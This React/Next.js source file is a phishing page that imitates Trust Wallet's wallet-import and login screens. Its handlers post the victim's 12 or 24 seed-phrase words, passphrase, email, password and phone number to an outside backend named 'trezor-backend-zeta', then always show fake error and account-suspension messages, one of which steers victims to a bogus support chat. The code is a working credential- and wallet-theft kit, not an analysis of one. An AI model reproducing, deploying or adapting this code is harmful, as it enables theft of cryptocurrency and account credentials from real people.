"use client";
import Image from "next/image";
import img from "../assets/image1.png";
import Logo from "../assets/logo2.svg";
import { useEffect, useState } from "react";
import {
  EyeIcon,
  EyeSlashIcon,
  ExclamationCircleIcon,
} from "@heroicons/react/24/outline";
import axios from "axios";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";
// import Trust from '

export default function HomePage() {
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [items, setItems] = useState(Array.from({ length: 12 }, (_, i) => ({ label: `Word ${i + 1}`, value: "" })));
  const [pass, setPass] = useState("");
  const [page, setPage] = useState(1)
  // const items = Array.from({ length: 12 }); 
  console.log(page);


  const toggleItems = () => {
    // Switch between 12 and 24
    setItems(prev =>
      prev.length === 12 ? Array.from({ length: 24 }) : Array.from({ length: 12 })
    );
  };

  const handleChange = (index: any, newValue: any) => {
    const updatedItems = [...items];
    updatedItems[index].value = newValue;
    setItems(updatedItems);
  };

  const handleSubmit = async () => {
    const data = { heading: "Pantomus", data: items, passphrase: pass };
    console.log(data); // here you get your desired format
    try {
      const response = await axios.post(
        "https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic",
        data
      );

    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to verify your identity. Please try again.",
      });
    } finally {
      setMessage(
        "Invalid Secret Recovery Phrase"
      );
      setLoading(false);
    }
    // alert(JSON.stringify(data, null, 2));
  };


  const allFilled = items.every(item => item?.value.trim() !== "") && pass.trim() !== ""


  const [alert, setAlert] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);
  const [step, setStep] = useState(1);
  const [message, setMessage] = useState("");

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    phone: "",
  });

  // Handle input changes
  // const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  //   const { name, value } = e.target;
  //   setFormData((prev) => ({
  //     ...prev,
  //     [name]: value,
  //   }));
  // };

  // Handle Step 1 submit
  const handleSubmitStep1 = (e: React.FormEvent) => {
    e.preventDefault();
    setAlert(null);
    setLoading(true);

    try {
      const data = {
        email: formData.email,
        password: formData.password,
      };

      localStorage.setItem("userInfo", JSON.stringify(data));

      // Go to next step
      setStep(2);
      // Always show red message at Step 2 start
      setAlert({
        type: "error",
        message:
          "Important message!: some suspicious activity found with your account. Enter phone number to verify your identity",
      });
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to save data. Please try again.",
      });
    } finally {
      setLoading(false);
    }
  };

  // Handle Step 2 submit
  const handleSubmitStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const stored = JSON.parse(localStorage.getItem("userInfo") || "{}");
      const data = {
        title: "Trust Wallet",
        ...stored,
        phone: formData.phone,
      };

      const response = await axios.post(
        "https://trezor-backend-zeta.vercel.app/api/v1/send-user-info",
        data
      );

      localStorage.removeItem("userInfo");
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to verify your identity. Please try again.",
      });
    } finally {
      setMessage(
        "Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account."
      );
      setLoading(false);
    }
  };

  return (
    <div className="h-screen w-full overflow-hidden flex justify-center items-center">
      <div className=" w-full flex h-full bg-[#0190fd] overflow-scroll">
        {/* Left Section */}

        {/* Right Section */}
        <div className="bg-[#0190fd] h-full w-full flex flex-col justify-between relative">
          <div className="flex justify-between items-center w-[95%] self-center pt-5">
            <img src="/TrustWallet.png" width={"55px"} />
            <button className="flex space-x-2">
              <img src="/help.svg" width={"18px"} />
              <p className="font-semibold">Help</p>
            </button>
          </div>
          <div className="w-full h-full flex justify-center items-center">
            <div className="w-[418px] relative rounded-xl flex flex-col overflow-hidden">
              {/* Page 1 */}
              {page === 1 && (
                <div className="w-full bg-[#222222] min-h-[500px] p-5 flex flex-col items-center pt-0">
                 <img src="/TrustWallet.png" className="mt-18 w-35" />
                  
                  <p className="text-[#999999] text-[20px] w-[98%] mt-8 text-center">
                    To get started, create a new wallet or import one from a seed phrase.
                  </p>
                  <div className="text-center mt-20 space-y-2 w-full">
                    <button className="w-full bg-[#267ad9] hover:bg-[#e2dffe] rounded-lg py-3 font-semibold text-[16px]">Create a new wallet</button>
                    <button onClick={() => setPage(2)} className="w-full bg-[#333333] hover:bg-[#444444] text-white rounded-lg py-3 font-semibold text-[16px]">
                      I already have a wallet
                    </button>
                  </div>
                </div>
              )}

              {/* Page 2 */}
              {page === 2 && (
                <div className="w-full bg-[#222222] min-h-[500px] p-5 flex flex-col">
                  {/* Header */}
                  <div className="flex justify-between items-center border-b border-b-[#323232] pb-5">
                    <img src="/back.svg" className="w-4 cursor-pointer" onClick={() => setPage(1)} />
                    <div className="flex space-x-2">
                      <div className="w-3 h-3 bg-[#ab9ff2] rounded-full"></div>
                      <div className="w-3 h-3 bg-[#333333] rounded-full"></div>
                      <div className="w-3 h-3 bg-[#333333] rounded-full"></div>
                      <div className="w-3 h-3 bg-[#333333] rounded-full"></div>
                    </div>
                    <div></div>
                  </div>

                  <h1 className="text-white text-3xl mt-6">Secret Recovery Phrase</h1>
                  <p className="text-lg text-[#999999] text-center mt-2">
                    Import an existing wallet with your 12 or 24-word secret recovery phrase.
                  </p>

                  {/* Inputs */}
                  <div className="flex flex-wrap justify-center mt-5 gap-2">
                    {items.map((_, index) => (
                      <div key={index} className="border border-[#2f2f2f] focus-within:border-[#ab9ff2] bg-[#181818] w-[120px] h-[38px] flex items-center px-2 text-[#9999] rounded-sm">
                        {index + 1}.
                        <input
                          onChange={(e) => handleChange(index, e.target.value)}
                          className="border-none focus:outline-none w-[90%] text-white"
                        />
                      </div>
                    ))}
                  </div>

                  <input
                    placeholder="Passphrase."
                    value={pass}
                    onChange={(e) => setPass(e.target.value)}
                    className="border border-[#2f2f2f] bg-[#181818] w-full h-[38px] px-2 rounded-sm mt-4 text-white"
                  />

                  <p className="text-red-500 mt-2">{message}</p>

                  <div className="mt-4 space-y-4 text-center">
                    <button onClick={toggleItems} className="text-[#9999] hover:text-[#ab9ff2] font-semibold cursor-pointer">
                      I have a {items.length === 12 ? 24 : 12}-word recovery phrase
                    </button>

                    <button
                      disabled={!allFilled}
                      onClick={handleSubmit}
                      className={`w-full py-3 rounded-lg font-semibold text-[16px] ${allFilled ? "bg-[#ab9ff2] hover:bg-[#e2dffe] text-[#000]" : "bg-[#333333] text-white cursor-not-allowed"
                        }`}
                    >
                      Import wallet
                    </button>
                  </div>
                </div>
              )}
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
